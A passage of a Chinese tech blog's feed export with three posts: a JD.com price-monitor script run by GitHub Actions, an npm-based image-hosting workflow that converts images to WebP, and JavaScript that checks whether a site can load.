Bot\"</span></span><br><span class=\"line\">    }</span><br><span class=\"line\">    request = urllib.request.Request(url=url, headers=headers)</span><br><span class=\"line\">    response = urllib.request.urlopen(request)</span><br><span class=\"line\">    page_text = json.loads(response.read().decode(<span class=\"string\">'utf-8'</span>))</span><br><span class=\"line\">    <span class=\"keyword\">if</span> page_text[<span class=\"string\">'code'</span>] == <span class=\"number\">0</span>:</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"literal\">True</span></span><br><span class=\"line\">    <span class=\"keyword\">else</span>:</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"literal\">False</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">notify</span>(<span class=\"params\"><span class=\"built_in\">id</span>,<span class=\"built_in\">type</span>,price,nowPrice</span>):</span></span><br><span class=\"line\">    <span class=\"string\">'''</span></span><br><span class=\"line\"><span class=\"string\">    type:</span></span><br><span class=\"line\"><span class=\"string\">        0: 涨价</span></span><br><span class=\"line\"><span class=\"string\">        1: 无变化</span></span><br><span class=\"line\"><span class=\"string\">        2: 降价</span></span><br><span class=\"line\"><span class=\"string\">    id: 商品 ID</span></span><br><span class=\"line\"><span class=\"string\">    price: 差价</span></span><br><span class=\"line\"><span class=\"string\">    nowPrice: 现价</span></span><br><span class=\"line\"><span class=\"string\">    '''</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">for</span> svId <span class=\"keyword\">in</span> server:</span><br><span class=\"line\">        <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">send</span>(<span class=\"params\">title,content</span>):</span></span><br><span class=\"line\">            <span class=\"keyword\">if</span> svId == <span class=\"string\">'wechat'</span>:</span><br><span class=\"line\">                wechat_send(wechat[<span class=\"string\">\"key\"</span>],title,content)</span><br><span class=\"line\">            <span class=\"keyword\">if</span> svId == <span class=\"string\">'qmsg'</span>:</span><br><span class=\"line\">                qmsg_send(qmsg[<span class=\"string\">\"key\"</span>],qmsg[<span class=\"string\">\"qid\"</span>],title + <span class=\"string\">\"\\n\"</span> + content)</span><br><span class=\"line\">            <span class=\"keyword\">else</span>:</span><br><span class=\"line\">                <span class=\"keyword\">return</span> <span class=\"literal\">False</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span> <span class=\"built_in\">type</span> == <span class=\"number\">0</span>:</span><br><span class=\"line\">            title = <span class=\"string\">\"商品 {0} 涨价!\"</span>.<span class=\"built_in\">format</span>(<span class=\"built_in\">id</span>)</span><br><span class=\"line\">            content = <span class=\"string\">\"您关注的商品 {0} 涨价咯！价格相较于上次监测，高了 {1} 元，现价 {2} 元。商品详情：https://item.jd.com/{0}.html\"</span>.<span class=\"built_in\">format</span>(<span class=\"built_in\">id</span>,price,nowPrice)</span><br><span class=\"line\">            send(title,content)</span><br><span class=\"line\">        <span class=\"keyword\">elif</span> <span class=\"built_in\">type</span> == <span class=\"number\">1</span>:</span><br><span class=\"line\">            print(<span class=\"string\">\"价格没有变化，不推送通知。\"</span>)</span><br><span class=\"line\">        <span class=\"keyword\">elif</span> <span class=\"built_in\">type</span> == <span class=\"number\">2</span>:</span><br><span class=\"line\">            title = <span class=\"string\">\"商品 {0} 降价!\"</span>.<span class=\"built_in\">format</span>(<span class=\"built_in\">id</span>)</span><br><span class=\"line\">            content = <span class=\"string\">\"您关注的商品 {0} 降价咯！价格相较于上次监测，低了 {1} 元，现价 {2} 元。商品详情：https://item.jd.com/{0}.html\"</span>.<span class=\"built_in\">format</span>(<span class=\"built_in\">id</span>, price,nowPrice)</span><br><span class=\"line\">            send(title, content)</span><br><span class=\"line\">        <span class=\"keyword\">else</span>:</span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"literal\">False</span></span><br></pre></td></tr></table></figure>\n</div></details><details class=\"post-details\"><summary><code>.github/workflows/auto.yml</code> (点击展开)</summary><div class=\"details-content\">  <figure class=\"highlight yaml\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"attr\">name:</span> <span class=\"string\">Check</span> <span class=\"string\">Price</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"attr\">on:</span></span><br><span class=\"line\">  <span class=\"attr\">push:</span></span><br><span class=\"line\">    <span class=\"attr\">branches:</span> </span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"string\">master</span></span><br><span class=\"line\">  <span class=\"attr\">schedule:</span></span><br><span class=\"line\">    <span class=\"comment\"># 每 1 小时运行一次</span></span><br><span class=\"line\">    <span class=\"bullet\">-</span> <span class=\"attr\">cron:</span> <span class=\"string\">\"0 * * * *\"</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"attr\">jobs:</span></span><br><span class=\"line\">  <span class=\"attr\">check:</span></span><br><span class=\"line\">    <span class=\"attr\">runs-on:</span> <span class=\"string\">ubuntu-latest</span></span><br><span class=\"line\">    <span class=\"attr\">steps:</span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">Clone</span> <span class=\"string\">repository</span></span><br><span class=\"line\">        <span class=\"attr\">uses:</span> <span class=\"string\">actions/checkout@v2</span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">'Set up Python'</span></span><br><span class=\"line\">        <span class=\"attr\">uses:</span> <span class=\"string\">actions/setup-python@v2</span></span><br><span class=\"line\">        <span class=\"attr\">with:</span></span><br><span class=\"line\">          <span class=\"attr\">python-version:</span> <span class=\"number\">3.7</span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">Run</span></span><br><span class=\"line\">        <span class=\"attr\">run:</span> <span class=\"string\">|</span></span><br><span class=\"line\">          <span class=\"string\">python</span> <span class=\"string\">main.py</span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">Push</span></span><br><span class=\"line\">        <span class=\"attr\">run:</span> <span class=\"string\">|</span></span><br><span class=\"line\">          <span class=\"string\">git</span> <span class=\"string\">config</span> <span class=\"string\">--local</span> <span class=\"string\">user.email</span> <span class=\"string\">\"icolabot@e.yfun.top\"</span></span><br><span class=\"line\">          <span class=\"string\">git</span> <span class=\"string\">config</span> <span class=\"string\">--local</span> <span class=\"string\">user.name</span> <span class=\"string\">\"iColaBot\"</span></span><br><span class=\"line\">          <span class=\"string\">date</span> <span class=\"string\">+\"%Y-%m-%d</span> <span class=\"string\">%H:%M:%S.%N\"</span> <span class=\"string\">&gt;</span> <span class=\"string\">date.txt</span></span><br><span class=\"line\">          <span class=\"string\">git</span> <span class=\"string\">add</span> <span class=\"string\">-A</span></span><br><span class=\"line\">          <span class=\"string\">git</span> <span class=\"string\">commit</span> <span class=\"string\">-am</span> <span class=\"string\">\"Update price.json\"</span></span><br><span class=\"line\">          <span class=\"string\">git</span> <span class=\"string\">push</span> <span class=\"string\">origin</span> <span class=\"string\">master</span></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n</div></details><h2>\n<a href=\"https://blog.yfun.top/#%E6%B3%A8%E6%84%8F\" class=\"headerlink\" title=\"注意\"></a>注意</h2>\n<p>计划任务语法有 5 个字段，中间用空格分隔，每个字段代表一个时间单位。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">┌───────────── 分钟 (0 - 59)</span><br><span class=\"line\">│ ┌───────────── 小时 (0 - 23)</span><br><span class=\"line\">│ │ ┌───────────── 日 (1 - 31)</span><br><span class=\"line\">│ │ │ ┌───────────── 月 (1 - 12 或 JAN-DEC)</span><br><span class=\"line\">│ │ │ │ ┌───────────── 星期 (0 - 6 或 SUN-SAT)</span><br><span class=\"line\">│ │ │ │ │</span><br><span class=\"line\">│ │ │ │ │</span><br><span class=\"line\">│ │ │ │ │</span><br><span class=\"line\">* * * * *</span><br></pre></td></tr></table></figure><p>每个时间字段的含义：</p>\n<table>\n<thead><tr>\n<th align=\"center\">符号</th>\n<th align=\"center\">描述</th>\n<th align=\"center\">举例</th>\n</tr></thead>\n<tbody>\n<tr>\n<td align=\"center\"><code>*</code></td>\n<td align=\"center\">任意值</td>\n<td align=\"center\">\n<code>* * * * *</code> 每天每小时每分钟</td>\n</tr>\n<tr>\n<td align=\"center\"><code>,</code></td>\n<td align=\"center\">值分隔符</td>\n<td align=\"center\">\n<code>1,3,4,7 * * * *</code> 每小时的 1 3 4 7 分钟</td>\n</tr>\n<tr>\n<td align=\"center\"><code>-</code></td>\n<td align=\"center\">范围</td>\n<td align=\"center\">\n<code>1-6 * * * *</code> 每小时的 1-6 分钟</td>\n</tr>\n<tr>\n<td align=\"center\"><code>/</code></td>\n<td align=\"center\">每</td>\n<td align=\"center\">\n<code>*/15 * * * *</code> 每隔 15 分钟</td>\n</tr>\n</tbody>\n</table>\n<blockquote><p>注：由于 GitHub Actions 的限制，如果设置为 <code>* * * * *</code> 实际的执行频率为每 5 分执行一次。</p></blockquote>\n<h2>\n<a href=\"https://blog.yfun.top/#%E5%90%8E\" class=\"headerlink\" title=\"后\"></a>后</h2>\n<p>新建文件 并 配置 <code>notify.py</code> 后，GitHub Action 就会定时执行代码。如果有降价或涨价，就会按照 <code>notify.py</code> 的配置进行通知。</p>\n<p>京东也有降价提醒的功能，但我实在是不想给 京东 开通知权限，经常推送商品广告。</p>\n<p>本文部分内容参考：<a href=\"https://github.com/justjavac/auto-green#readme\">justjavac/auto-green#readme</a></p>\n","link":"https://blog.yfun.top/posts/1238639652/"},{"title":"我的图床解决方案","date":"2021-05-08 10:30:00","description":"\n<p>博客的文章经常需要插入图片，如果我将文档与图片放在一起，那么图片的加载速度将会很慢，于是我使用了图床。</p>\n<p>图床的选择有很多，<a href=\"https://blog.yfun.top/posts/3867215122/\">笔者之前写过一篇关于免费图床的汇总</a>，本文就来介绍下我采用的方案：NPM。</p>\n<blockquote><p>本文假设您已有 NPM 账号、GitHub 账号。</p></blockquote>\n<h2>\n<a href=\"https://blog.yfun.top/#%E5%87%86%E5%A4%87%E5%B7%A5%E4%BD%9C\" class=\"headerlink\" title=\"准备工作\"></a>准备工作</h2>\n<h3>\n<a href=\"https://blog.yfun.top/#%E6%96%B0%E5%BB%BA%E4%BB%93%E5%BA%93\" class=\"headerlink\" title=\"新建仓库\"></a>新建仓库</h3>\n<p>新建一个 GitHub 仓库，公开或是私人都可以，此处不再赘述。</p>\n<p>在 Git 仓库中新建 <code>rawimg/.gitkeep</code> 与 <code>webpimg/.gitkeep</code> 两个文件。</p>\n<h3>\n<a href=\"https://blog.yfun.top/#%E8%8E%B7%E5%8F%96%E4%BB%A4%E7%89%8C\" class=\"headerlink\" title=\"获取令牌\"></a>获取令牌</h3>\n<p>登录 <a href=\"https://npmjs.com/\">https://npmjs.com</a> ，点击右上角的头像，进入 <code>Access Token</code>。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.8/rawimg/1Xbrlw.png\"></p>\n<p>点击页面中的 <code>Generate New Token</code> 获取新的令牌。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.8/rawimg/OQMmsB.png\"></p>\n<p>选择 <code>Automation</code>，点击 <code>Generate Token</code> 生成令牌。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.8/rawimg/4Ob3xs.png\"></p>\n<p>将生成的令牌复制下来。</p>\n<p>进入 GitHub 仓库，点击 <code>Settings</code>。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.8/rawimg/UfBqld.png\"></p>\n<p>点击菜单栏中的 <code>Secrets</code>。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.8/rawimg/SStNlF.png\"></p>\n<p>点击 <code>New repository secret</code> 新建一个 Secret。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.8/rawimg/UYSnao.png\"></p>\n<p>Secret Name 为 <code>NPM_TOKEN</code>，Value 是你的 NPM 令牌，点击 <code>Add secret</code> 添加。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.8/rawimg/OY4C6A.png\"></p>\n<p>在仓库中新建 <code>package.json</code> 文件，参考如下：</p>\n<figure class=\"highlight json\"><table><tr><td class=\"code\"><pre><span class=\"line\">{</span><br><span class=\"line\">  <span class=\"attr\">\"name\"</span>: <span class=\"string\">\"ocoke-osg\"</span>,</span><br><span class=\"line\">  <span class=\"attr\">\"version\"</span>: <span class=\"string\">\"0.0.0\"</span>,</span><br><span class=\"line\">  <span class=\"attr\">\"description\"</span>: <span class=\"string\">\"Somewhere to save the file from @oCoke\"</span>,</span><br><span class=\"line\">  <span class=\"attr\">\"author\"</span>: <span class=\"string\">\"YFun(@oCoke)\"</span></span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure><h2>\n<a href=\"https://blog.yfun.top/#%E5%9B%BE%E7%89%87%E8%BD%AC%E6%8D%A2%E4%B8%8E%E5%8F%91%E5%B8%83\" class=\"headerlink\" title=\"图片转换与发布\"></a>图片转换与发布</h2>\n<p>为了方便多端写作，我使用 GitHub 临时存储所需的图片，GitHub Action 发布 NPM 包。</p>\n<p>WebP 可以大大缩减图片的尺寸，我们还可以借助 GitHub Action 在发布前自动转换。</p>  <details class=\"post-details\"><summary>GitHub Action 代码 (点击展开)</summary><div class=\"details-content\">  <figure class=\"highlight yaml\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"attr\">name:</span> <span class=\"string\">NPM</span> <span class=\"string\">&amp;</span> <span class=\"string\">WebP</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 在 Release 发布时 或手动执行</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"attr\">on:</span></span><br><span class=\"line\">  <span class=\"attr\">release:</span></span><br><span class=\"line\">     <span class=\"attr\">types:</span></span><br><span class=\"line\">       <span class=\"bullet\">-</span> <span class=\"string\">published</span></span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"attr\">workflow_dispatch:</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"attr\">jobs:</span></span><br><span class=\"line\">  <span class=\"attr\">publish-npm:</span></span><br><span class=\"line\">    <span class=\"attr\">runs-on:</span> <span class=\"string\">ubuntu-latest</span></span><br><span class=\"line\">    <span class=\"comment\"># Clone 仓库</span></span><br><span class=\"line\">    <span class=\"attr\">steps:</span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">Checkout</span></span><br><span class=\"line\">        <span class=\"attr\">uses:</span> <span class=\"string\">actions/checkout@v2</span></span><br><span class=\"line\">        <span class=\"attr\">with:</span></span><br><span class=\"line\">          <span class=\"attr\">ref:</span> <span class=\"string\">master</span></span><br><span class=\"line\">      <span class=\"comment\"># 安装 Node.js    </span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">Setup</span> <span class=\"string\">Node</span></span><br><span class=\"line\">        <span class=\"attr\">uses:</span> <span class=\"string\">actions/setup-node@v1</span></span><br><span class=\"line\">        <span class=\"attr\">with:</span></span><br><span class=\"line\">          <span class=\"attr\">node-version:</span> <span class=\"string\">\"12.x\"</span></span><br><span class=\"line\">          <span class=\"attr\">registry-url:</span> <span class=\"string\">https://registry.npmjs.org/</span></span><br><span class=\"line\">        </span><br><span class=\"line\">      <span class=\"comment\"># rawimg/ 作为原始图片存储，webpimg/ 作为压缩图片存储处，最后合并。</span></span><br><span class=\"line\">      <span class=\"comment\"># 安装相关插件，转换图片。</span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">Install</span> <span class=\"string\">&amp;</span> <span class=\"string\">Convert</span></span><br><span class=\"line\">        <span class=\"attr\">run:</span> <span class=\"string\">|</span></span><br><span class=\"line\">          <span class=\"string\">npm</span> <span class=\"string\">install</span> <span class=\"string\">-g</span> <span class=\"string\">webp-batch-convert</span></span><br><span class=\"line\">          <span class=\"string\">cwebp-batch</span> <span class=\"string\">--in</span> <span class=\"string\">rawimg</span> <span class=\"string\">--out</span> <span class=\"string\">webpimg</span> <span class=\"string\">-q</span> <span class=\"number\">75</span> <span class=\"string\">-quiet</span></span><br><span class=\"line\">          <span class=\"string\">mv</span> <span class=\"string\">webpimg/*.webp</span> <span class=\"string\">rawimg/</span></span><br><span class=\"line\">          </span><br><span class=\"line\">      <span class=\"comment\"># 发布 NPM 包</span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">Publish</span> <span class=\"string\">Package</span></span><br><span class=\"line\">        <span class=\"attr\">run:</span> <span class=\"string\">|</span></span><br><span class=\"line\">          <span class=\"string\">git</span> <span class=\"string\">config</span> <span class=\"string\">--global</span> <span class=\"string\">user.email</span> <span class=\"string\">\"icolabot@e.yfun.top\"</span></span><br><span class=\"line\">          <span class=\"string\">git</span> <span class=\"string\">config</span> <span class=\"string\">--global</span> <span class=\"string\">user.name</span> <span class=\"string\">\"iColaBot\"</span></span><br><span class=\"line\">          <span class=\"string\">npm</span> <span class=\"string\">version</span> <span class=\"string\">patch</span></span><br><span class=\"line\">          <span class=\"string\">npm</span> <span class=\"string\">publish</span></span><br><span class=\"line\">        <span class=\"attr\">env:</span></span><br><span class=\"line\">          <span class=\"attr\">NODE_AUTH_TOKEN:</span> <span class=\"string\">${{secrets.npm_token}}</span></span><br><span class=\"line\">          </span><br><span class=\"line\">      <span class=\"comment\"># 删除 rawimg/ 和 webpimg/ 下的所有文件</span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">Delete</span> <span class=\"string\">Files</span></span><br><span class=\"line\">        <span class=\"attr\">run:</span> <span class=\"string\">|</span></span><br><span class=\"line\">          <span class=\"string\">rm</span> <span class=\"string\">-rf</span> <span class=\"string\">webpimg/*</span></span><br><span class=\"line\">          <span class=\"string\">rm</span> <span class=\"string\">-rf</span> <span class=\"string\">rawimg/*</span></span><br><span class=\"line\">          <span class=\"string\">touch</span> <span class=\"string\">webpimg/.gitkeep</span></span><br><span class=\"line\">          <span class=\"string\">touch</span> <span class=\"string\">rawimg/.gitkeep</span></span><br><span class=\"line\">          </span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">Push</span></span><br><span class=\"line\">        <span class=\"attr\">run:</span> <span class=\"string\">|</span></span><br><span class=\"line\">          <span class=\"string\">git</span> <span class=\"string\">add</span> <span class=\"string\">-A</span></span><br><span class=\"line\">          <span class=\"string\">git</span> <span class=\"string\">commit</span> <span class=\"string\">-m</span> <span class=\"string\">\"Publish\"</span></span><br><span class=\"line\">          <span class=\"string\">git</span> <span class=\"string\">push</span> <span class=\"string\">origin</span> <span class=\"string\">master</span></span><br></pre></td></tr></table></figure>\n</div></details><h2>\n<a href=\"https://blog.yfun.top/#%E4%BD%BF%E7%94%A8\" class=\"headerlink\" title=\"使用\"></a>使用</h2>\n<h3>\n<a href=\"https://blog.yfun.top/#%E4%B8%8A%E4%BC%A0\" class=\"headerlink\" title=\"上传\"></a>上传</h3>\n<p>将图片文件上传至仓库的 <code>rawimg/</code> 文件夹下即可。</p>\n<p>当然也可以使用 PicGo / UPic / HexoPlusPlus 等工具上传。</p>\n<h3>\n<a href=\"https://blog.yfun.top/#%E5%8F%91%E5%B8%83\" class=\"headerlink\" title=\"发布\"></a>发布</h3>\n<p>在 GitHub 中新建 Release，将自动修改版本号并发布 NPM 包，无需手动修改 <code>package.json</code>。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.8/rawimg/t2afFy.png\"></p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.8/rawimg/0wAmRV.png\"></p>\n<h3>\n<a href=\"https://blog.yfun.top/#%E8%AE%BF%E9%97%AE\" class=\"headerlink\" title=\"访问\"></a>访问</h3>\n<h4>\n<a href=\"https://blog.yfun.top/#%E6%8E%A8%E8%8D%90%E7%9A%84%E9%95%9C%E5%83%8F\" class=\"headerlink\" title=\"推荐的镜像\"></a>推荐的镜像</h4>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">https://cdn.jsdelivr.net/npm/  <span class=\"comment\"># jsDelivr</span></span><br><span class=\"line\">https://unpkg.zhimg.com/ <span class=\"comment\"># 知乎</span></span><br><span class=\"line\">https://code.bdstatic.com/npm/ <span class=\"comment\"># 百度 (不推荐)</span></span><br><span class=\"line\">https://shadow.elemecdn.com/npm/ <span class=\"comment\"># 饿了么</span></span><br><span class=\"line\">https://unpkg.com/ <span class=\"comment\"># Unpkg</span></span><br></pre></td></tr></table></figure><p>镜像推荐选择访问速度快的，比较稳定的，拉取速度快的。</p>\n<p>我选择的是 jsDelivr，国内外速度都很优秀。</p>\n<h4>\n<a href=\"https://blog.yfun.top/#%E9%93%BE%E6%8E%A5\" class=\"headerlink\" title=\"链接\"></a>链接</h4>\n<p>以 jsDelivr 为例，原图链接为：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">https://cdn.jsdelivr.net/npm/[package-name]@[version]/rawimg/[filename].[suffix]</span><br></pre></td></tr></table></figure><p>WebP 图片链接为：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">https://cdn.jsdelivr.net/npm/[package-name]@[version]/rawimg/[filename].webp</span><br></pre></td></tr></table></figure><table>\n<thead><tr>\n<th>[值]</th>\n<th>说明</th>\n</tr></thead>\n<tbody>\n<tr>\n<td><code>package-name</code></td>\n<td>NPM 包的名称 (<code>package.json</code> 文件中 <code>name</code> 的值)</td>\n</tr>\n<tr>\n<td><code>version</code></td>\n<td>当前版本 (<code>package.json</code> 文件中 <code>version</code> 的值，通常需要在发布 Release 1 分钟后更新)</td>\n</tr>\n<tr>\n<td><code>filename</code></td>\n<td>文件名</td>\n</tr>\n<tr>\n<td><code>suffix</code></td>\n<td>文件后缀名</td>\n</tr>\n</tbody>\n</table>\n","link":"https://blog.yfun.top/posts/2876015612/"},{"title":"使用 JS 检测网址能否正常加载","date":"2021-04-09 12:42:00","description":"\n<p>有时我们需要判断用户能否加载某些网页或服务，如 Google、Disqus 等。</p>\n<p>而我们可以用 JavaScript 来实现这样的检测功能。</p>\n<h2>\n<a href=\"https://blog.yfun.top/#%E6%96%B9%E6%B3%95%E4%B8%80\" class=\"headerlink\" title=\"方法一\"></a>方法一</h2>\n<p>使用 JavaScript 创建一个图片，设置图片的链接为 检测网址 + <code>favicon.ico</code>。</p>\n<p><code>onerror</code> 事件触发不能加载的事件，<code>onload</code> 事件触发可以加载的事件，并使用 <code>setTimeout</code> 设置超时时间。</p>\n<p>代码：</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 新建一个图片</span></span><br><span class=\"line\"><span class=\"keyword\">var</span> img = <span class=\"keyword\">new</span> Image();</span><br><span class=\"line\"><span class=\"comment\">// 设置图片的链接</span></span><br><span class=\"line\">img.src = <span class=\"string\">\"https://google.com/favicon.ico\"</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 设定超时事件，延迟 3000 毫秒</span></span><br><span class=\"line\"><span class=\"keyword\">var</span> timeout = <span class=\"built_in\">setTimeout</span>(<span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\"></span>) </span>{</span><br><span class=\"line\">    <span class=\"comment\">// 清除 onerror 和 onload 事件</span></span><br><span class=\"line\">img.onerror = img.onload = <span class=\"literal\">null</span>;</span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(<span class=\"string\">\"time out.\"</span>);</span><br><span class=\"line\">    <span class=\"comment\">// 执行无法加载的事件</span></span><br><span class=\"line\">    canNotLoad();</span><br><span class=\"line\">},<span class=\"number\">3000</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 设定错误事件</span></span><br><span class=\"line\">img.onerror = <span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\"></span>) </span>{</span><br><span class=\"line\">    <span class=\"comment\">// 先清除超时事件</span></span><br><span class=\"line\"><span class=\"built_in\">clearTimeout</span>(timeout);</span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(<span class=\"string\">\"load error.\"</span>);</span><br><span class=\"line\">    <span class=\"comment\">// 执行无法加载的事件</span></span><br><span class=\"line\">    canNotLoad();</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 设定可以加载的事件</span></span><br><span class=\"line\">img.onload = <span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\"></span>) </span>{</span><br><span class=\"line\">    <span class=\"comment\">// 先清除超时事件</span></span><br><span class=\"line\"><span class=\"built_in\">clearTimeout</span>(timeout);</span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(<span class=\"string\">\"ok.\"</span>);</span><br><span class=\"line\">    <span class=\"comment\">// 执行可以加载的事件</span></span><br><span class=\"line\">    canLoad();</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">canNotLoad</span>(<span class=\"params\"></span>) </span>{</span><br><span class=\"line\">    <span class=\"comment\">/* code here */</span></span><br><span class=\"line\">    <span class=\"built_in\">console</span>.log(<span class=\"string\">\"无法加载\"</span>);</span><br><span class=\"line\">}</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">canLoad</span>(<span class=\"params\"></span>) </span>{</span><br><span class=\"line\">    <span class=\"comment\">/* code here */</span></span><br><span class=\"line\">    <span class=\"built_in\">console</span>.log(<span class=\"string\">\"可以加载\"</span>);</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure><p>缺点：不是每一个网站都存在 <code>/favicon.ico</code> 文件，但如果加载特定文件的话挺好的。</p>\n<h2>\n<a href=\"https://blog.yfun.top/#%E6%96%B9%E6%B3%95%E4%BA%8C\" class=\"headerlink\" title=\"方法二\"></a>方法二</h2>\n<p>使用 JavaScript 创建一个 iframe 标签，设置标签的链接为 检测网址。</p>\n<p><code>onerror</code> 事件触发不能加载的事件，<code>onload</code> 事件触发可以加载的事件，并使用 <code>setTimeout</code> 设置超时时间。</p>\n<p>代码：</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 新建 iframe 标签</span></span><br><span class=\"line\"><span class=\"keyword\">var</span> iframe = <span class=\"built_in\">document</span>.createElement(<span class=\"string\">\"iframe\"</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 设置 iframe 标签的网址</span></span><br><span class=\"line\">iframe.src=<span class=\"string\">\"https://google.com\"</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 设定超时事件，延迟 3000 毫秒</span></span><br><span class=\"line\"><span class=\"keyword\">var</span> timeout = <span class=\"built_in\">setTimeout</span>(<span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\"></span>) </span>{</span><br><span class=\"line\">    <span class=\"comment\">// 清除 onerror 和 onload 事件</span></span><br><span class=\"line\">    iframe.onerror = iframe.onload = <span class=\"literal\">null</span>;</span><br><span class=\"line\">    <span class=\"built_in\">console</span>.log(<span class=\"string\">\"time out.\"</span>);</span><br><span class=\"line\">    <span class=\"comment\">// 执行无法加载的事件</span></span><br><span class=\"line\">    canNotLoad();</span><br><span class=\"line\">},<span class=\"number\">3000</span>);</span><br><span class=\"line\"><span class=\"comment\">// 设定错误事件</span></span><br><span class=\"line\">iframe.onerror = <span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\"></span>) </span>{</span><br><span class=\"line\">    <span class=\"comment\">// 先清除超时事件</span></span><br><span class=\"line\">    <span class=\"built_in\">clearTimeout</span>(timeout);</span><br><span class=\"line\">    <span class=\"built_in\">console</span>.log(<span class=\"string\">\"load error.\"</span>);</span><br><span class=\"line\">    <span class=\"comment\">// 执行无法加载的事件</span></span><br><span class=\"line\">    canNotLoad();</span><br><span class=\"line\">}</span><br><span class=\"line\"><span class=\"comment\">// 设定可以加载的事件</span></span><br><span class=\"line\">iframe.onload = <span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\"></span>) </span>{</span><br><span class=\"line\">    <span class=\"comment\">// 先清除超时事件</span></span><br><span class=\"line\">    <span class=\"built_in\">clearTimeout</span>(timeout);</span><br><span class=\"line\">    <span class=\"built_in\">console</span>.log(<span class=\"string\">\"ok.\"</span>);</span><br><span class=\"line\">    <span class=\"comment\">// 执行可以加载的事件</span></span><br><span class=\"line\">    canLoad();</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">canNotLoad</span>(<span class=\"params\"></span>) </span>{</span><br><span class=\"line\">    <span class=\"comment\">/* code here */</span></span><br><span class=\"line\">}</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">canLoad</span>(<span class=\"params\"></span>) </span>{</span><br><span class=\"line\">    <span class=\"comment\">/* code here */</span></span><br><span class=\"line\">}</span><br><span class=\"line\"><span class=\"comment\">// 设定为不可见</span></span><br><span class=\"line\">iframe.style = <span class=\"string\">\"display: none!important;\"</span>;</span><br><span class=\"line\"><span class=\"comment\">// 向 body 添加 iframe</span></span><br><span class=\"line\"><span class=\"built_in\">document</span>.body.appendChild(iframe);</span><br></pre></td></tr></table></figure><p>缺点：页面上的其他外部链接也会被一并的加载过来，例如 JS 文件，CSS 